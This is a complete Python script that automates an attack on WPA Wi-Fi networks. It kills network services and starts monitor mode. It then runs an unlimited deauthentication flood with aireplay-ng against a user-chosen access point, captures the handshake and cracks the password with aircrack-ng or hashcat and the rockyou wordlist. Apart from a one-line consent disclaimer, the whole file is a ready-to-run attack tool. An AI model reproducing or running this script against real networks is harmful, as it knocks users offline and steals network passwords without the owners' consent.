#!/usr/bin/env python3
import subprocess
import os
import time
import sys

uid = os.getuid()

def check_handshake(pcap_file):
    # Use tshark to check for WPA handshakes in the pcap file
    result = subprocess.run(['tshark', '-r', pcap_file, '-Y', 'eapol'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return 'EAPOL' in result.stdout.decode()

def install_package(package):
    try:
        subprocess.run(['apt-get', 'install', '-y', package], check=True)
    except subprocess.CalledProcessError as e:
        print(f'Error installing {package}: {e}')
        sys.exit(1)

def check_program_installed(program):
    try:
        subprocess.run(['which', program], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError:
        print(f'{program} is not installed. Installing...')
        if program == 'hcxpcapngtool':
            install_package('hcxtools')  # hcxpcapngtool is in the hcxtools package
        elif program in ['tshark', 'aircrack-ng', 'hashcat', 'john', 'hccap2john']:
            install_package(program)
        else:
            print(f'Error: {program} installation not supported.')
            sys.exit(1)
        return False

def get_valid_interface():
    while True:
        interface = input('\nEnter the interface to use with airmon-ng: ')
        result = subprocess.run(['iwconfig', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if b"no such device" not in result.stderr.lower():
            return interface
        else:
            print('Invalid interface. Please enter a valid network interface.')

def main():
    # Check required programs
    required_programs = ['tshark', 'aircrack-ng', 'hcxpcapngtool', 'hashcat', 'john', 'hccap2john']
    for prog in required_programs:
        if not check_program_installed(prog):
            print(f'Error: {prog} is not installed. Please install it and try again.')
            sys.exit(1)

    if uid != 0:
        print('You must be root to run this script.')
        sys.exit(1)

    subprocess.run(['clear'])
    # Clear the terminal from any mess
    print("By using this script, you agree that you are using it for Legal/ethical/Educational purposes and with consent from the person you're attacking.")
    
    while True:
        maybe = input('Running this script requires you to shut down some network services. You will not be able to connect to the internet.\n\nProceed? (y/n):')
        if maybe.lower() == 'y':
            break
        elif maybe.lower() == 'n':
            print('Exiting...')
            sys.exit(0)
        else:
            print('Invalid option. Please enter y or n.')

    print('\nKilling all conflicting processes...')
    subprocess.run(['airmon-ng', 'check', 'kill'])
    subprocess.run(['iwconfig'])

    interface = get_valid_interface()
    print('\nStarting up Airmon-ng...')
    subprocess.run(['airmon-ng', 'start', interface])

    print('Starting airodump-ng, press Ctrl+C when ready to stop...')
    time.sleep(2)

    try:
        subprocess.run(['airodump-ng', interface])
    except KeyboardInterrupt:
        pass

    bssid = input('\nEnter the BSSID you would like to attack: ')
    channel = input('Enter the channel it is running on: ')
    outfile = input('Enter the name for the output file: ')

    print(f'Running a deauth attack on {bssid} channel {channel}...')
    time.sleep(2)
    pcap_file = f'/tmp/{outfile}-01.cap'
    airodump_process = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'/tmp/{outfile}', interface])
    subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, interface])

    print('\nPress Ctrl+C when ready to stop airodump-ng and check for handshake...')
    try:
        airodump_process.wait()
    except KeyboardInterrupt:
        airodump_process.terminate()

    print('\nChecking for handshake...')
    time.sleep(1) 

    if check_handshake(pcap_file):
        while True:
            print('Handshake detected! Do you want to crack the password? (y/n)')
            crack = input()
            if crack.lower() == 'y':
                wordlist = input('Enter the path to your wordlist (leave empty to use rockyou.txt): ')
                if not wordlist:
                    wordlist = '/usr/share/wordlists/rockyou.txt'

                cracked = False
                while not cracked:
                    print("""
                        Choose a tool to (attempt) to crack the handshake:
                        [1] Crack with aircrack-ng
                        [2] Crack with hashcat
                        [3] Exit
                        """)
                    choice = input('Choice: ')

                    if choice == '1':
                        subprocess.run(['aircrack-ng', '-w', wordlist, '-b', bssid, pcap_file])
                        break
                    elif choice == '2':
                        hash_file = f'/tmp/{outfile}.hc22000'
                        subprocess.run(['hcxpcapngtool', '-o', hash_file, pcap_file])
                        subprocess.run(['hashcat', '-m', '22000', '-a', '0', hash_file, wordlist])
                        cracked = True
                    elif choice == '3':

                        print('Exiting...')
                        sys.exit(0)
                    else:
                        print('Invalid choice, please try again.')
                break
            elif crack.lower() == 'n':
                print('Skipping password cracking. The pcap files are stored in the /tmp directory if you want to see them.')
                exit()
            else:
                print('Invalid option. Please enter y/n.')
    else:
        print('No handshake detected.')

if __name__ == '__main__':
    main()

#Tasneem will you marry me :)
